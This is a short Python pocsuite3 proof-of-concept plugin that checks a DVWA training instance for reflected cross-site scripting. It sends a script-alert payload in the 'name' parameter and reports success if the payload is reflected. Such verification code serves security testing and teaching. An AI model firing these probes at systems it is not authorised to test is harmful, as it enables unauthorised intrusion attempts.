# -*- coding: utf-8 -*-
from pocsuite3.api import POCBase, Output, register_poc, requests, VUL_TYPE


class POC(POCBase):
    name = 'DVWA Reflected XSS'
    vulType = VUL_TYPE.XSS

    def _verify(self):
        result = {}
        target = self.url.rstrip('/')
        if "vulnerabilities/xss_r" in target.lower():
            if not target.endswith('.php'):
                target += '/index.php'

            # 构造探测 Payload
            payload = "<script>alert('pocsuite_test')</script>"
            self.set_payload(payload)

            try:
                # 检查 Payload 是否原样反射在页面内容中
                res = requests.get(target, params={'name': payload}, timeout=10)
                if payload in res.text:
                    result['VerifyInfo'] = {"URL": target}
            except:
                pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(POC)